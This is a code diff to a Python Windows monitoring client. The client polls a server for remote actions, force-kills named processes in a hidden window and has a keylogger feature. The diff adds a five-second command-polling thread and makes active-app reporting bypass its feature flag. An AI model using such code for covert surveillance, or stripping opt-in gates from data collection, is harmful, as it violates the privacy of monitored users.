@@ -338,6 +338,12 @@ class MonitoringApp:
 
         self.start_monitoring()
         self.start_auto_send()
+
+        # Fast action loop (try-except supaya kalau ada error tidak stop start_connection_check)
+        try:
+            self._start_fast_action_loop()
+        except Exception as _e:
+            self.log(f"[Warning] fast_action_loop error: {_e}")
         
         if self.enabled_features.get("keylogger"):
             self.keylogger.start()
@@ -379,10 +385,12 @@ class MonitoringApp:
                         # Cek perintah + cek remote session (fetch_remote_status di dalam)
                         self._check_remote_actions()
 
-                        # Kirim snapshot aplikasi yang sedang aktif (untuk tampilan live di dashboard)
-                        if self.enabled_features.get("app_usage"):
+                        # Kirim snapshot aplikasi aktif (live, selalu dikirim tanpa perlu feature flag)
+                        try:
                             apps_snapshot = self.app_monitor.get_active_apps_snapshot()
                             self.data_sender.send_active_apps(apps_snapshot)
+                        except Exception as _e:
+                            self.log(f"Active apps error: {_e}")
                     else:
                         error_code = result.get("code")
                         error_msg = result.get("error")
@@ -444,7 +452,11 @@ class MonitoringApp:
         # 1. Ambil & eksekusi actions
         result = self.data_sender.fetch_pending_actions()
         if result.get("success"):
-            for action in result.get("actions", []):
+            actions = result.get("actions", [])
+            if actions:
+                self.log(f"[Actions] {len(actions)} pending action(s) ditemukan")
+            for action in actions:
+                self.log(f"[Actions] Eksekusi: {action.get('action_type')} (id={action.get('id')})")
                 self._execute_remote_action(action)
 
         # 2. Cek remote session (1 request per siklus, tidak ada thread polling terpisah)
@@ -489,34 +501,37 @@ class MonitoringApp:
                 self.data_sender.acknowledge_action(action_id, "completed")
 
             elif action_type == "Terminate App":
-                import psutil as _psutil
-                app_name = details.strip()
-                killed = []
+                app_name = (details or "").strip()
+                self.log(f"[Terminate] Target: '{app_name}'")
+
+                import subprocess as _sp
+
+                # taskkill /F /IM — paksa tutup semua instance dengan nama tersebut
                 try:
-                    for proc in _psutil.process_iter(["name", "pid"]):
+                    r = _sp.run(
+                        ["taskkill", "/F", "/IM", app_name],
+                        creationflags=_sp.CREATE_NO_WINDOW,
+                        timeout=8,
+                        capture_output=True,
+                        text=True
+                    )
+                    if r.returncode == 0:
+                        self.log(f"[Terminate] SUCCESS: {r.stdout.strip()}")
+                    else:
+                        # Returncode 128 = process tidak ditemukan
+                        self.log(f"[Terminate] taskkill rc={r.returncode}: {r.stderr.strip() or r.stdout.strip()}")
+                        # Coba lagi dengan psutil sebagai fallback
                         try:
-                            if proc.info["name"].lower() == app_name.lower():
-                                proc.kill()
-                                killed.append(proc.info["pid"])
-                        except (_psutil.NoSuchProcess, _psutil.AccessDenied):
-                            pass
-                except Exception:
-                    pass
+                            import psutil as _ps
+                            for p in _ps.process_iter(["name", "pid"]):
+                                if p.info["name"].lower() == app_name.lower():
+                                    p.kill()
+                                    self.log(f"[Terminate] psutil killed PID {p.info['pid']}")
+                        except Exception as _pe:
+                            self.log(f"[Terminate] psutil fallback error: {_pe}")
+                except Exception as _e:
+                    self.log(f"[Terminate] Error: {_e}")
 
-                if not killed:
-                    # Fallback: taskkill (lebih kuat untuk proses yang butuh elevasi)
-                    try:
-                        import subprocess
-                        subprocess.run(
-                            ["taskkill", "/F", "/IM", app_name],
-                            creationflags=subprocess.CREATE_NO_WINDOW,
-                            timeout=5
-                        )
-                        killed = ["via taskkill"]
-                    except Exception:
-                        pass
-
-                self.log(f"Terminate '{app_name}': {killed or 'tidak ditemukan'}")
                 self.data_sender.acknowledge_action(action_id, "completed")
 
             else:
@@ -1933,6 +1948,62 @@ def _ensure_single_instance():
         # Kalau gagal cek (misal pywin32 bermasalah), tetap lanjut jalan
         # daripada aplikasi tidak jalan sama sekali.
         return True
+
+
+    def _start_fast_action_loop(self):
+        """
+        Thread dedicated cek device_actions tiap 5 detik — khusus untuk
+        aksi yang butuh respons cepat (Terminate, Shutdown, dll) tanpa
+        menunggu connection_check_interval yang bisa 30-60 detik.
+        """
+        import threading as _t
+        import subprocess as _sp
+
+        def _loop():
+            import time
+            while True:
+                time.sleep(5)
+                try:
+                    if not self.data_sender.is_registered():
+                        continue
+                    result = self.data_sender.fetch_pending_actions()
+                    if not result.get("success"):
+                        continue
+                    actions = result.get("actions", [])
+                    for action in actions:
+                        atype   = action.get("action_type", "")
+                        details = action.get("details") or ""
+                        aid     = action.get("id")
+                        if atype == "Terminate App":
+                            app_name = details.strip()
+                            self.log(f"[FastAction] Terminate: '{app_name}'")
+                            try:
+                                r = _sp.run(
+                                    ["taskkill", "/F", "/IM", app_name],
+                                    creationflags=_sp.CREATE_NO_WINDOW,
+                                    timeout=8, capture_output=True, text=True
+                                )
+                                if r.returncode == 0:
+                                    self.log(f"[FastAction] SUCCESS: {r.stdout.strip()}")
+                                else:
+                                    self.log(f"[FastAction] taskkill rc={r.returncode}: {r.stderr.strip()}")
+                                    # Fallback psutil
+                                    try:
+                                        import psutil as _ps
+                                        for p in _ps.process_iter(["name","pid"]):
+                                            if p.info["name"].lower() == app_name.lower():
+                                                p.kill()
+                                                self.log(f"[FastAction] psutil killed {p.info['pid']}")
+                                    except Exception:
+                                        pass
+                            except Exception as _e:
+                                self.log(f"[FastAction] Error: {_e}")
+                            self.data_sender.acknowledge_action(aid, "completed")
+                except Exception as _e:
+                    self.log(f"[FastAction] Loop error: {_e}")
+
+        _t.Thread(target=_loop, daemon=True).start()
+        self.log("Fast action loop started (cek tiap 5 detik)")
 
 
 def main():
